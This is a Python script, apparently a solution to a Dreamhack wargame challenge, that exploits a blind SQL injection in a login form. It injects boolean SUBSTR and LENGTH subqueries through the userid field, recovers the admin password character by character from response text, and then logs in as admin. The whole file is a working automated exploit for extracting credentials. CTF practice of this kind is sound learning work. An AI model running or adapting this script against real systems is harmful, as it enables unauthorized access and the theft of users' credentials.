import requests

port = 10463
url_login = f"http://host1.dreamhack.games:{port}/login"


def findLength(low, high):
    mid = (low + high) // 2
    if low == high or low + 1 == high:
        return mid

    query = f'((SELECT LENGTH(userpassword) WHERE userid="admin") < {mid})'
    p = {"userid": f'" OR {query} --', "userpassword": ""}
    r = requests.post(url_login, data=p)
    if "hello" in r.text:
        return findLength(low, mid)
    else:
        return findLength(mid, high)


length = findLength(0, 100)
# length = 32


password = ""
for i in range(1, length + 1):
    for j in range(47, 127):
        ch = chr(j)
        query = (
            f'((SELECT SUBSTR(userpassword, {i}, 1) WHERE userid="admin") = CHAR({j}))'
        )
        p = {"userid": f'" OR {query} --', "userpassword": ""}
        r = requests.post(url_login, data=p)
        if "hello" in r.text:
            password += ch
            break

print(password)

param = {"userid": "admin", "userpassword": f"{password}"}
response = requests.post(url_login, data=param)
print(response.text)
